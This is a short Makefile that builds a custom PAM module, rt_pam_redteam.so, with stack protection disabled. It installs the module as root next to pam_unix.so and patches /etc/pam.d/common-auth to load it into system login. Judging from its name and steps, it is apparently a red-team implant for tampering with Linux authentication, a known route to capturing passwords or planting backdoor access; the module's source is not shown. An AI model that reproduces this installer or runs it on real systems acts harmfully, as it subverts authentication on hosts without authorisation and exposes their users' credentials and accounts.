install: rt_pam_redteam.so
	sudo chmod 644 rt_pam_redteam.so
	sudo chown root:root rt_pam_redteam.so
	sudo rm -f "$(shell find /usr/lib* -name "pam_unix.so" | xargs dirname)/rt_pam_redteam.so"
	sudo cp rt_pam_redteam.so $(shell find /usr/lib* -name "pam_unix.so" | xargs dirname)
	grep -q "pam_redteam" /etc/pam.d/common-auth || sudo patch /etc/pam.d/common-auth < common-auth.patch

rt_pam_redteam.so: pam_redteam.o
	gcc -shared -o rt_pam_redteam.so pam_redteam.o -lpam

pam_redteam.o: pam_redteam.c
	gcc -fPIC -fno-stack-protector -c pam_redteam.c -o pam_redteam.o